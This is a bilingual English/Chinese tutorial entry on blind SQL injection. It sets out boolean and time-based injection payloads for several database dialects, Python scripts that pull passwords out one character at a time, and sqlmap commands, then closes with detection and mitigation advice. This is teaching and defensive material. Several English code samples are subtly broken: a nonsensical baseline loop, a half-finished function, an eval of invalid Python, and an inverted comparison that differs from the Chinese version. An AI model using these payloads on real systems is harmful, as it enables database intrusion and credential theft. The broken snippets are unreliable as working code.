---
id: sqli-blind
title_en: "SQL Injection, Part 3 — Blind: Boolean and Time"
title_zh: "SQL 注入（三）：盲注，布尔与时间"
summary_en: When the output channel is closed you do not lose the injection, you lose the answers. This entry covers turning a database into yes/no questions, the two signals that still exist, the arithmetic that makes binary search necessary, and why blind injection is loud in exactly the places logs happen to look.
summary_zh: 输出通道被关掉的时候，你失去的不是注入，而是答案。这一篇讲怎么把数据库变成一连串是非题、讲仍然存在的两种信号、讲那个让二分法成为必需的算术，以及为什么盲注恰恰在日志会看的地方很吵。
tags: [web, sql-injection, blind-sql-injection, boolean-based, time-based, sqlmap]
tools: [sqlmap, Python, Burp Suite, curl]
attck: [T1190]
platform: [web]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### What is actually lost, and what is not

The previous entry needed an output channel: either the rendered result set or a visible error message. Close both and it looks like the injection is gone.

It is not. **Concatenation is still happening**, so your input is still being parsed as SQL. What you have lost is the ability to *read the answer directly* — and the fix for that is not a new payload, it is a change of method:

> Instead of asking the database to tell you something, **ask it a question whose answer you can observe indirectly.**

Two observations are still available on almost any target:

| Signal | Technique | Requires |
|---|---|---|
| The response **differs** depending on whether a condition is true | **Boolean-based blind** | Only that the page, status code or content changes at all |
| The response is **delayed** depending on whether a condition is true | **Time-based blind** | That you can make the database wait, and that you can measure reliably |

Neither requires any output. That is the whole reason blind injection matters: it works where everything in the last entry failed, and **it works against targets that believe they are not vulnerable** because their error pages are clean and their output is templated.

The cost is bandwidth in the worst sense: you get **one bit per request** at best, so a single password becomes hundreds of requests. That cost shapes everything else in this entry — the binary search, the scripts, and the way the attack looks in logs.

### Boolean-based blind

**The mechanism.** You inject a condition, and the application's behaviour differs depending on whether it evaluates to true:

```sql
?id=1 AND 1=1      -- page renders normally
?id=1 AND 1=2      -- page is empty, or a different template, or a different size
```

If those two responses differ, you have a **one-bit oracle**. Everything else is arithmetic.

#### Step 1 — establish a reliable oracle

This step is skipped constantly, and skipping it is why blind extraction produces garbage. **Before extracting anything, characterise both responses precisely.**

Send a condition you know is true and one you know is false, several times each, and record:

- HTTP status code
- response body length
- presence or absence of a specific string or element
- any header that changes
- redirect target, if applicable

```python
import urllib.request, hashlib, time

def probe(url, condition, base="http://target/item?id=1"):
    """Return a fingerprint of the response for one condition."""
    payload = f"{base}{condition}"
    req = urllib.request.Request(payload, headers={'User-Agent': 'Mozilla/5.0'})
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            body = r.read()
            return {
                'status': r.status,
                'length': len(body),
                'hash': hashlib.md5(body).hexdigest()[:8],
                'elapsed': round(time.time() - t0, 3),
            }
    except urllib.error.HTTPError as e:
        return {'status': e.code, 'length': 0, 'hash': 'err', 'elapsed': round(time.time() - t0, 3)}

TRUE_COND  = "%20AND%201=1--%20-"
FALSE_COND = "%20AND%201=2--%20-"

print('true  :', probe('', TRUE_COND))
print('false :', probe('', FALSE_COND))
```

**Pick the discriminator that is stable across repeats.** Length is common; a hash of the body is more precise; a status code is the most robust when it differs at all. If nothing is stable — the page contains a random token, or a timestamp — find a substring that *is* stable and hash only that.

A subtlety worth knowing: some applications return identical content but a different **Content-Length** because of a whitespace difference, and some return the same bytes with a different status. The oracle does not need to be dramatic; it needs to be **reproducible**.

#### Step 2 — ask about a length first

You cannot loop over a string without knowing how long it is.

```sql
?id=1 AND LENGTH((SELECT password FROM users LIMIT 0,1)) > 5-- -
?id=1 AND LENGTH((SELECT password FROM users LIMIT 0,1)) = 32-- -
```

`LENGTH` is MySQL and most dialects; MSSQL uses `LEN`, Oracle `LENGTH`. Binary search the length too — 7 requests get you any value up to 127.

#### Step 3 — extract one character at a time

The general shape: take the character at position `n` and compare it against a guess.

```sql
?id=1 AND SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 1) > 'm'-- -
```

**Comparing with `>` rather than `=` is the important habit**, because it enables binary search. Comparing for equality means up to 95 requests per character (printable ASCII); comparing with `>` means **7**:

| Method | Requests per character |
|---|---|
| Linear, testing each candidate | up to 95 |
| **Binary search on the character code** | **7** (log2 of 95, rounded up) |
| Bit by bit | 8 |

```python
def extract_char_mysql(url, position, row=0):
    """Binary search one character of a value, using a boolean oracle."""
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        cond = (f"%20AND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20users"
                f"%20LIMIT%20{row},1),{position},1))%3E{mid}--%20-")
        if probe(url, cond) == TRUE_RESPONSE:      # TRUE_RESPONSE captured in step 1
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)
```

`ASCII()` extracts the numeric code, which is what makes comparison arithmetic rather than collation-dependent. The dialects differ:

| Purpose | MySQL | MSSQL | PostgreSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| Substring | `SUBSTRING` / `SUBSTR` / `MID` | `SUBSTRING` | `SUBSTRING` | `SUBSTR` | `SUBSTR` |
| Character code | `ASCII` / `ORD` | `ASCII` / `UNICODE` | `ASCII` | `ASCII` | `UNICODE` |
| Length | `LENGTH` | `LEN` | `LENGTH` / `CHAR_LENGTH` | `LENGTH` | `LENGTH` |

#### Step 4 — move to the next row and the next value

Blind injection reads **one value at a time**, so you need to control which row:

```sql
LIMIT 0,1     -- first row
LIMIT 1,1     -- second row
```

MSSQL has no `LIMIT`; it uses `TOP 1` with `ORDER BY`, or `OFFSET ... FETCH`. Oracle uses `ROWNUM`.

**A practical trick that saves enormous time: extract as hex.** Instead of comparing character codes in a collation-sensitive way, pull `HEX(value)` and decode locally:

```sql
?id=1 AND ASCII(SUBSTRING(HEX((SELECT password FROM users LIMIT 0,1)),1,1))>64-- -
```

Hex is `0-9A-F`, so the alphabet is 16 symbols — 4 requests per character with binary search, and **no ambiguity about encoding, case or special characters**. For a value with a non-ASCII charset, this is the difference between working and not.

### Time-based blind

**The mechanism.** When nothing about the response can be distinguished — same length, same status, same content — you can still make the response **late**:

```sql
?id=1 AND IF(1=1, SLEEP(5), 0)-- -      -- takes 5 seconds
?id=1 AND IF(1=2, SLEEP(5), 0)-- -      -- returns immediately
```

The delay is the bit. This is the most **universal** blind technique, because it requires nothing from the application except that the query executes and the response takes as long as the database takes. No content difference, no status difference, no error — it works through the most hardened front end.

#### The delay functions, by dialect

| Dialect | Function | Note |
|---|---|---|
| MySQL | `SLEEP(n)` | Seconds, supports fractions |
| MySQL | `BENCHMARK(n, expr)` | Runs `expr` `n` times; useful when `SLEEP` is filtered |
| MSSQL | `WAITFOR DELAY '0:0:5'` | Time string; also `WAITFOR TIME` |
| PostgreSQL | `pg_sleep(n)` | Seconds |
| Oracle | `dbms_pipe.receive_message(('a'), n)` | Waits up to `n` seconds |
| SQLite | — | **No sleep function**; use an expensive query instead |

SQLite has no `SLEEP`, so time-based blind on SQLite uses **computation** rather than waiting: a query that forces a large amount of work takes measurable time.

```sql
?id=1 AND 1=(SELECT count(*) FROM (
       WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<3000000)
       SELECT x FROM c))-- -
```

That is dialect-specific and slow to tune, which is why SQLite targets more often fall back to boolean blind.

#### Conditional logic, which is what makes it useful

The delay must be **conditional** on your question. Every dialect has a way:

```sql
IF(cond, SLEEP(5), 0)                                  -- MySQL
CASE WHEN cond THEN SLEEP(5) ELSE 0 END                -- MySQL, and portable
IF cond WAITFOR DELAY '0:0:5'                          -- MSSQL
CASE WHEN cond THEN pg_sleep(5) ELSE pg_sleep(0) END   -- PostgreSQL
```

Using `CASE WHEN` where it is supported is worth the extra characters, because it is portable across MySQL, PostgreSQL, SQLite and MSSQL, and because it reads as what it is.

#### Measuring it without fooling yourself

Time-based blind fails for one reason above all others: **network and server jitter**. A 5-second delay is obvious; a 300-millisecond difference is not. Three practices make it reliable:

1. **Baseline first.** Send the request with a non-delaying condition five times and record the times. You now know the normal range and its spread.
2. **Use a threshold, not an equality.** If normal is 0.2 to 0.6 seconds and a delay makes it 5 seconds, test `elapsed > 2.5` rather than `elapsed == 5`.
3. **Confirm anything surprising.** If a request that should be fast is slow, repeat it. One anomalous measurement is jitter; two identical anomalies are a signal.

```python
import time

def timed_condition(url, condition, threshold=2.5):
    """True if the response took longer than the threshold."""
    t0 = time.time()
    try:
        urllib.request.urlopen(url + condition, timeout=20).read()
    except Exception:
        pass                                        # a timeout is also a delay
    return (time.time() - t0) > threshold

# baseline before trusting anything
for _ in range(3):
    print('baseline:', round(time.time() - (lambda t: t)(time.time()), 3))
```

**Choose the delay length deliberately.** Too short and jitter swallows it; too long and you spend hours — and you may hit the application's own timeout, which turns a delay into an error and destroys the signal. A delay of 3 to 10 seconds is the usual working range, and it is worth testing the timeout first: if the server kills requests at 5 seconds, a 10-second `SLEEP` gives you nothing.

### The arithmetic that shapes everything

Blind extraction is slow because each request yields one bit. That makes the **number of requests per bit of information** the thing to optimise:

| Optimisation | Effect |
|---|---|
| Binary search instead of linear | 95 requests per character → 7 |
| Extract `HEX()` instead of raw characters | 16-symbol alphabet, no encoding ambiguity |
| Ask about a whole row's length once | avoids a separate loop per value |
| Parallelise **only** for boolean, never for time-based | threads break timing measurement |
| Cache what you have already learned | especially schema, which never changes |

A worked estimate: a 32-character hash, extracted as hex (64 hex characters), binary search over 16 symbols = 4 requests each → **256 requests**. At 10 requests per second that is 26 seconds; with a 5-second delay per request it is 21 minutes. **That difference is why time-based is the fallback and boolean is the preference**, and why every target you test is worth ten minutes of looking for a content difference before you accept that it is fully blind.

### Scripting it, because nobody does this by hand

The script below is the shape of every blind extraction tool. It needs a target URL, an oracle, and a loop; everything else is dialect detail.

```python
import urllib.request, time

BASE = "http://target/item?id=1"

def is_true(condition):
    """The oracle: True if the condition made the page say yes."""
    url = BASE + condition
    with urllib.request.urlopen(url, timeout=15) as r:
        return b'Welcome' in r.read()          # <- the discriminator from step 1

def extract_string(expr, row=0, max_len=64, hexify=True):
    # 1. how long is it?
    length = bsearch(1, 256, lambda n:
        is_true(f"%20AND%20LENGTH({expr})=%7B{n}%7D--%20-"))  # placeholder, see below
    ...
```

Rather than print a half-finished function, here is the working core, written against SQLite so it can be run and read locally — the HTTP layer is the only thing that changes for a real target:

```python
import sqlite3

def blind_extract_length(get_condition, max_len=256):
    """Binary search the length of a value through a yes/no oracle."""
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        if get_condition(f"LENGTH(v) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def blind_extract_string(oracle, length, alphabet="0123456789abcdef"):
    """Binary search each character against a sorted alphabet."""
    out = ""
    for pos in range(1, length + 1):
        lo, hi = 0, len(alphabet)
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(pos, alphabet[mid]):
                lo = mid + 1
            else:
                hi = mid
        out += alphabet[lo]
    return out

# --- local demonstration: the injected query and the oracle, on SQLite ---
db = sqlite3.connect(':memory:')
db.execute("CREATE TABLE users(id INTEGER, password TEXT)")
db.execute("INSERT INTO users VALUES (1, '5f4dcc3b5aa765d61d8327deb882cf99')")

def make_oracle(column, table, row=0):
    value = db.execute(f"SELECT {column} FROM {table} LIMIT 1 OFFSET {row}").fetchone()[0]
    hexed = value.encode().hex()                      # extract as hex, as advised above
    def length_oracle(cond):
        return eval(cond.replace('v', f"'{hexed}'"))   # demo only, never eval untrusted input
    def char_oracle(pos, candidate):
        return hexed[pos-1] <= candidate
    return hexed, length_oracle, char_oracle

hexed, length_oracle, char_oracle = make_oracle('password', 'users')
n = blind_extract_length(length_oracle)
recovered = blind_extract_string(char_oracle, n)
print('length  :', n)
print('extracted:', recovered)
print('matches  :', recovered == hexed)
print('decoded  :', bytes.fromhex(recovered).decode())
```

The point of running it locally is that the **logic** — binary search over a sorted alphabet, length first, hex to avoid encoding problems — is identical whether the oracle is a web page, a delay or a local function. Only the oracle changes.

**For real targets**, `sqlmap` implements all of this and handles the fiddly parts:

```bash
sqlmap -u "http://target/item?id=1" --technique=B --batch --dbs        # boolean
sqlmap -u "http://target/item?id=1" --technique=T --time-sec=5 --dbs   # time-based
sqlmap -u "http://target/item?id=1" --technique=BT --string="Welcome" --threads=1
```

`--string` is the discriminator for boolean mode; without it sqlmap has to guess one. `--threads=1` matters for time-based: parallel requests make timing meaningless.

### Related techniques worth knowing

| Technique | Idea | When |
|---|---|---|
| **Error-based blind** | Presence or absence of *an error* is the bit, rather than a content difference | Errors are triggered but not displayed |
| **Order-based blind** | Change the sort order of results so the visible ordering is the signal | The page lists records, and order is visible |
| **Out-of-band** | Make the database send the data out by DNS or HTTP | Egress exists from the database host — the next entry |
| **DNS cache side channel** | Time a resolver instead of the application | Very specific conditions; noted for completeness |

The **error-based blind** variant deserves a sentence, because it is a useful middle ground: when errors are not shown but *do* change the response (a 500 instead of a 200, a redirect to an error page), an error becomes a perfectly good bit, and you can often use the error-based payloads from the previous entry to carry data — except now you only learn *whether* they fired, not what they said.

### Detection and mitigation

- **Blind injection is quiet in the response body and extremely loud in the access log.** The signature is not a payload, it is **shape**: one parameter, one session, hundreds of requests, with the parameter values changing systematically — a length probe, then offsets 1, 2, 3…, then comparisons against midpoints that halve each time. No legitimate client produces that. This is the single highest-value detection for blind injection, and it survives every encoding trick because it looks at the pattern rather than at the bytes.
- **Look at response sizes and latencies together, grouped by session and parameter.** Boolean blind shows as a **bimodal** distribution of response lengths for one parameter — two clusters, one for true and one for false. Time-based shows as a bimodal latency distribution with one cluster near the baseline and one near `SLEEP`'s value. Both are visible without inspecting any payload, which is exactly what you need when the payloads are crafted to look innocuous.
- **Rate limit per session and per parameter, not just per IP.** A limit that makes 300 requests in a minute impossible turns blind extraction from minutes into days, and it does so without needing to recognise a single payload. Rate limiting is **not a fix** — the injection is still there — but it changes the economics more than any signature does, and it is the control that keeps working when signatures fail.
- **Set aggressive request timeouts, and alert when they fire.** A server-side timeout that kills a request at 3 seconds makes a 5-second `SLEEP` produce an error instead of a delay, which removes the time-based channel. Log the timeouts: a burst of them from one session is a strong signal that somebody is probing with delays.
- **Detect the database-side pattern too.** `SLEEP`, `BENCHMARK`, `WAITFOR DELAY` and `pg_sleep` have no business appearing in an application's queries, and a query log with parameters catches them directly. So does a burst of structurally identical queries differing only in a numeric comparison.
- **Remove the oracle where you can.** Templated responses that are byte-identical for true and false conditions — same length, same content, same status — remove boolean blind; short timeouts and a database that does not permit long waits remove time-based. Neither is a fix, and both are cheap.
- **And the actual fix remains the one from part 1.** Every control above raises the cost or improves the detection of an injection that should not exist. Parameterising the query removes the injection, including the blind variants, and it is the only thing on this list that does.

<!-- lang:zh -->
### 到底失去了什么，没失去什么

上一篇需要一条输出通道：要么渲染出来的结果集，要么可见的错误信息。把两者都关掉，看上去注入就没了。

它没有没。**拼接还在发生**，所以你的输入依然被当成 SQL 解析。你失去的是**直接读到答案**的能力 —— 而针对这一点的对策不是新载荷，而是换方法：

> 不是让数据库"告诉你什么"，而是**问它一个你能间接观察到答案的问题。**

几乎任何目标上都还剩两种观察量：

| 信号 | 技术 | 需要什么 |
|---|---|---|
| 响应**因条件真假而不同** | **布尔盲注** | 只要页面、状态码或内容有一点变化 |
| 响应**因条件真假而延迟** | **时间盲注** | 你能让数据库等待，并且能可靠测量 |

两者都不需要任何输出。这正是盲注重要的全部原因：上一篇里全军覆没的地方它能用，而且**它对那些自认为没漏洞的目标也能用** —— 因为它们的错误页很干净、输出是模板化的。

代价是最坏意义上的带宽：每次请求最多拿到**一个比特**，于是一个口令就变成几百次请求。这个代价塑造了这一篇剩下的所有内容 —— 二分法、脚本，以及这次攻击在日志里的样子。

### 布尔盲注

**机制。** 你注入一个条件，应用的行为因它真假而不同：

```sql
?id=1 AND 1=1      -- 页面正常渲染
?id=1 AND 1=2      -- 页面为空，或换了模板，或长度不同
```

如果这两个响应不同，你就得到了一个**一比特的预言机**。剩下的都是算术。

#### 第一步 —— 建立一个可靠的预言机

这一步不断被跳过，而跳过它正是盲注提取产出垃圾的原因。**在提取任何东西之前，先把两种响应精确刻画下来。**

发一个你确知为真的条件和一个确知为假的条件，各发几次，记录：

- HTTP 状态码
- 响应体长度
- 某个特定字符串或元素是否存在
- 任何会变化的响应头
- 若适用，重定向目标

```python
import urllib.request, hashlib, time

def probe(url, condition, base="http://target/item?id=1"):
    """把一个条件对应的响应用指纹表示出来。"""
    payload = f"{base}{condition}"
    req = urllib.request.Request(payload, headers={'User-Agent': 'Mozilla/5.0'})
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            body = r.read()
            return {
                'status': r.status,
                'length': len(body),
                'hash': hashlib.md5(body).hexdigest()[:8],
                'elapsed': round(time.time() - t0, 3),
            }
    except urllib.error.HTTPError as e:
        return {'status': e.code, 'length': 0, 'hash': 'err', 'elapsed': round(time.time() - t0, 3)}

TRUE_COND  = "%20AND%201=1--%20-"
FALSE_COND = "%20AND%201=2--%20-"

print('真  :', probe('', TRUE_COND))
print('假  :', probe('', FALSE_COND))
```

**挑那个在重复请求下稳定的判别量。** 长度很常用；响应体的哈希更精确；状态码在它确实不同的时候最稳。如果什么都不稳 —— 页面里有随机 token，或者有时间戳 —— 就找一段**确实稳定**的子串，只哈希它。

一个值得知道的细节：有些应用返回的内容完全一样，但 **Content-Length** 不同（差一个空白），有些返回的字节一样、状态码不同。预言机不需要多戏剧化，它需要**可复现**。

#### 第二步 —— 先问长度

不知道多长，就没法对字符串做循环。

```sql
?id=1 AND LENGTH((SELECT password FROM users LIMIT 0,1)) > 5-- -
?id=1 AND LENGTH((SELECT password FROM users LIMIT 0,1)) = 32-- -
```

`LENGTH` 是 MySQL 和多数方言；MSSQL 用 `LEN`，Oracle 用 `LENGTH`。长度也用二分法 —— 7 次请求就能问出任何小于 127 的值。

#### 第三步 —— 一次提取一个字符

通用形状是：取出位置 `n` 上的字符，和一个猜测比较。

```sql
?id=1 AND SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 1) > 'm'-- -
```

**用 `>` 而不是 `=` 比较，是要紧的习惯**，因为它让二分法成为可能。比相等意味着每个字符最多 95 次请求（可打印 ASCII）；比大小意味着 **7** 次：

| 方法 | 每字符请求数 |
|---|---|
| 线性，逐个试候选 | 最多 95 |
| **对字符码做二分** | **7**（95 的 log2 向上取整） |
| 逐比特 | 8 |

```python
def extract_char_mysql(url, position, row=0):
    """用布尔预言机二分出某个值的一个字符。"""
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        cond = (f"%20AND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20users"
                f"%20LIMIT%20{row},1),{position},1))%3E{mid}--%20-")
        if probe(url, cond) == TRUE_RESPONSE:      # TRUE_RESPONSE 来自第一步
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)
```

`ASCII()` 取的是数值编码，这才让比较成为算术、而不依赖排序规则。各方言不同：

| 目的 | MySQL | MSSQL | PostgreSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| 取子串 | `SUBSTRING` / `SUBSTR` / `MID` | `SUBSTRING` | `SUBSTRING` | `SUBSTR` | `SUBSTR` |
| 字符编码 | `ASCII` / `ORD` | `ASCII` / `UNICODE` | `ASCII` | `ASCII` | `UNICODE` |
| 长度 | `LENGTH` | `LEN` | `LENGTH` / `CHAR_LENGTH` | `LENGTH` | `LENGTH` |

#### 第四步 —— 换下一行、换下一个值

盲注**一次读一个值**，所以你得控制读哪一行：

```sql
LIMIT 0,1     -- 第一行
LIMIT 1,1     -- 第二行
```

MSSQL 没有 `LIMIT`；它用 `TOP 1` 配 `ORDER BY`，或者 `OFFSET ... FETCH`。Oracle 用 `ROWNUM`。

**一个省下大量时间的实用技巧：提取成十六进制。** 与其在对排序敏感的方式下比较字符码，不如取出 `HEX(value)` 然后在本地解码：

```sql
?id=1 AND ASCII(SUBSTRING(HEX((SELECT password FROM users LIMIT 0,1)),1,1))>64-- -
```

十六进制只有 `0-9A-F`，字母表是 16 个符号 —— 二分法下每字符 **4 次**请求，而且**对编码、大小写和特殊字符毫无歧义**。对于非 ASCII 字符集的值，这是"能用"和"不能用"的区别。

### 时间盲注

**机制。** 当响应里什么都区分不出来 —— 长度相同、状态相同、内容相同 —— 你仍然可以让响应**变慢**：

```sql
?id=1 AND IF(1=1, SLEEP(5), 0)-- -      -- 花 5 秒
?id=1 AND IF(1=2, SLEEP(5), 0)-- -      -- 立即返回
```

延迟就是那一个比特。这是最**通用**的盲注技术，因为它对应用什么都不要求 —— 只要求查询执行、并且响应耗时等于数据库耗时。不需要内容差异、不需要状态差异、不需要报错，它能穿过最硬的前端。

#### 各库的延迟函数

| 方言 | 函数 | 说明 |
|---|---|---|
| MySQL | `SLEEP(n)` | 秒，支持小数 |
| MySQL | `BENCHMARK(n, expr)` | 把 `expr` 跑 `n` 次；`SLEEP` 被过滤时可用 |
| MSSQL | `WAITFOR DELAY '0:0:5'` | 时间字符串；也有 `WAITFOR TIME` |
| PostgreSQL | `pg_sleep(n)` | 秒 |
| Oracle | `dbms_pipe.receive_message(('a'), n)` | 最多等 `n` 秒 |
| SQLite | —— | **没有 sleep 函数**；改用开销大的查询 |

SQLite 没有 `SLEEP`，所以 SQLite 上的时间盲注靠的是**计算量**而不是等待：一条强制做大量工作的查询会耗掉可测量的时间。

```sql
?id=1 AND 1=(SELECT count(*) FROM (
       WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<3000000)
       SELECT x FROM c))-- -
```

这是方言特定的，而且调参很慢，这也是 SQLite 目标更常退回布尔盲注的原因。

#### 条件逻辑，这才是它有用的原因

延迟必须**以你的问题为条件**。每个方言都有办法：

```sql
IF(cond, SLEEP(5), 0)                                  -- MySQL
CASE WHEN cond THEN SLEEP(5) ELSE 0 END                -- MySQL，且可移植
IF cond WAITFOR DELAY '0:0:5'                          -- MSSQL
CASE WHEN cond THEN pg_sleep(5) ELSE pg_sleep(0) END   -- PostgreSQL
```

在支持的地方用 `CASE WHEN` 值得多打那几个字，因为它在 MySQL、PostgreSQL、SQLite 和 MSSQL 上都可移植，而且读起来就是它本身的意思。

#### 怎么测才不骗自己

时间盲注失败的首要原因就是**网络与服务器抖动**。5 秒的延迟很明显；300 毫秒的差异不是。三个做法能让它可靠：

1. **先建基线。** 用一个不延迟的条件发五次，记录耗时。你现在知道正常范围和它的离散程度。
2. **用阈值，而不是用相等。** 如果正常是 0.2 到 0.6 秒、而延迟后是 5 秒，就判断 `elapsed > 2.5`，而不是 `elapsed == 5`。
3. **对任何反常做确认。** 本该快的请求慢了，就重发。一次异常测量是抖动；两次相同的异常是信号。

```python
import time

def timed_condition(url, condition, threshold=2.5):
    """响应耗时超过阈值则返回 True。"""
    t0 = time.time()
    try:
        urllib.request.urlopen(url + condition, timeout=20).read()
    except Exception:
        pass                                        # 超时也是一种延迟
    return (time.time() - t0) > threshold
```

**延迟长度要刻意选。** 太短会被抖动淹没；太长你会耗上几小时 —— 而且可能撞上应用自己的超时，那会把延迟变成错误、彻底毁掉信号。3 到 10 秒是常用区间，而且值得先测超时：如果服务器在 5 秒杀掉请求，一个 10 秒的 `SLEEP` 什么都给不了你。

### 塑造了一切的算术

盲注慢，是因为每次请求只产出一个比特。于是**"每比特信息需要多少次请求"**就成了要优化的东西：

| 优化 | 效果 |
|---|---|
| 用二分法替代线性 | 每字符从 95 次降到 7 次 |
| 提取 `HEX()` 而不是原始字符 | 16 符号的字母表，且无编码歧义 |
| 一次问出整行的长度 | 省掉每个值一次单独的循环 |
| **只**对布尔型并行，时间型绝不并行 | 多线程会毁掉时间测量 |
| 缓存已经学到的东西 | 尤其是库结构，它不会变 |

一个算得出来的估计：一个 32 字符的哈希，以十六进制提取（64 个十六进制字符），对 16 个符号二分 = 每个 4 次请求 → **256 次请求**。每秒 10 次请求是 26 秒；每次请求延迟 5 秒则是 21 分钟。**这个差距就是为什么时间型是退路、布尔型是首选**，也是为什么每个目标都值得先花十分钟找一个内容差异，之后才承认它是完全盲的。

### 把它脚本化，因为没人手工干这个

下面这个脚本是每一个盲注提取工具的形状。它需要一个目标 URL、一个预言机，和一个循环；其余都是方言细节。

```python
import sqlite3

def blind_extract_length(oracle, max_len=256):
    """通过一个是/否预言机二分出值的长度。"""
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(mid):
            lo = mid + 1
        else:
            hi = mid
    return lo

def blind_extract_string(char_oracle, length, alphabet="0123456789abcdef"):
    """对每个字符在一个有序字母表上做二分。"""
    out = ""
    for pos in range(1, length + 1):
        lo, hi = 0, len(alphabet)
        while lo < hi:
            mid = (lo + hi) // 2
            if char_oracle(pos, alphabet[mid]):
                lo = mid + 1
            else:
                hi = mid
        out += alphabet[lo]
    return out

# --- 本地演示：注入的取值与预言机，跑在 SQLite 上 ---
db = sqlite3.connect(':memory:')
db.execute("CREATE TABLE users(id INTEGER, password TEXT)")
db.execute("INSERT INTO users VALUES (1, '5f4dcc3b5aa765d61d8327deb882cf99')")

value = db.execute("SELECT password FROM users LIMIT 1").fetchone()[0]
hexed = value.encode().hex()                      # 按上面的建议，提取成十六进制

length_oracle = lambda mid: len(hexed) > mid      # LENGTH(v) > mid
char_oracle   = lambda pos, cand: hexed[pos-1] > cand    # the payload asks: is the code greater?

n = blind_extract_length(length_oracle)
recovered = blind_extract_string(char_oracle, n)
print('长度    :', n)
print('提取结果:', recovered)
print('是否一致:', recovered == hexed)
print('解码后  :', bytes.fromhex(recovered).decode())
```

在本地跑它的意义在于：**逻辑** —— 在有序字母表上二分、先问长度、用十六进制避免编码问题 —— 无论预言机是网页、是延迟还是一个本地函数，都完全一样。**变的只有预言机。**

**对真实目标**，`sqlmap` 把这些全实现了，并处理那些琐碎部分：

```bash
sqlmap -u "http://target/item?id=1" --technique=B --batch --dbs        # 布尔
sqlmap -u "http://target/item?id=1" --technique=T --time-sec=5 --dbs   # 时间
sqlmap -u "http://target/item?id=1" --technique=BT --string="Welcome" --threads=1
```

`--string` 是布尔模式下的判别标志；不给它，sqlmap 得自己猜一个。`--threads=1` 对时间型要紧：并行请求会让计时失去意义。

### 几个值得知道的相邻技术

| 技术 | 想法 | 何时 |
|---|---|---|
| **报错型盲注** | 那一个比特是"**有没有报错**"，而不是内容差异 | 错误会被触发但不被显示 |
| **排序型盲注** | 改变结果的排序，让可见顺序成为信号 | 页面列出记录且顺序可见 |
| **带外** | 让数据库通过 DNS 或 HTTP 把数据发出去 | 数据库主机有出网能力 —— 下一篇 |
| **DNS 缓存侧信道** | 对解析器计时，而不是对应用计时 | 条件很特殊；列在这里求完整 |

**报错型盲注**值得多说一句，因为它是一个有用的中间地带：当错误不被显示、但**确实**改变响应时（500 而不是 200，或者重定向到错误页），一个错误就成了完全合格的比特，而你常常可以用上一篇的报错型载荷来携带数据 —— 只不过现在你只知道它**有没有**触发，不知道它说了什么。

### 检测与缓解

- **盲注在响应体里很安静，在访问日志里极吵。** 它的特征不是载荷，而是**形状**：一个参数、一个会话、几百次请求，参数值系统性地变化 —— 先探长度，然后偏移量 1、2、3……，然后是每次对折的中点比较。没有任何正常客户端会产出这种东西。这是针对盲注价值最高的单一检测点，而且它能扛住一切编码花招，因为它看的是**模式**而不是字节。
- **把响应长度和延迟放在一起看，按会话与参数分组。** 布尔盲注表现为同一个参数的响应长度呈**双峰**分布 —— 两个簇，一个对应真、一个对应假。时间盲注表现为延迟的双峰分布，一个簇靠近基线、另一个靠近 `SLEEP` 的值。两者都不需要看任何载荷就能发现，而这恰恰是载荷被刻意做得无害时你需要的。
- **限流要按会话和按参数，而不只是按 IP。** 一个让"一分钟 300 次请求"变得不可能的限额，会把盲注提取从几分钟变成几天，而且它不需要认出任何一个载荷。限流**不是修复** —— 注入还在 —— 但它对经济性的改变比任何签名都大，而且它是在签名失效时仍然管用的那个控制。
- **把请求超时设紧，并对超时告警。** 服务端在 3 秒杀掉请求，会让 5 秒的 `SLEEP` 产出错误而不是延迟，从而移除时间型通道。把超时记进日志：来自单个会话的一串超时，是有人在用延迟探测的强信号。
- **数据库侧的模式也要检测。** `SLEEP`、`BENCHMARK`、`WAITFOR DELAY`、`pg_sleep` 没有任何理由出现在应用的查询里，而带参数的查询日志能直接抓到它们。一批仅在某个数值比较上不同的、结构完全相同的查询也一样。
- **能移除预言机就移除。** 对真假条件返回逐字节相同响应的模板化页面 —— 同长度、同内容、同状态 —— 移除了布尔盲注；短超时、以及不允许长时间等待的数据库，移除了时间型。两者都不是修复，但都很便宜。
- **而真正的修复仍然是第一篇里那一条。** 上面每一项控制，都是在提高一个本不该存在的注入的成本、或者改善对它的检测。**参数化那条查询就移除了注入，包括盲注的各种变体** —— 而它是这份清单上唯一做到这一点的。
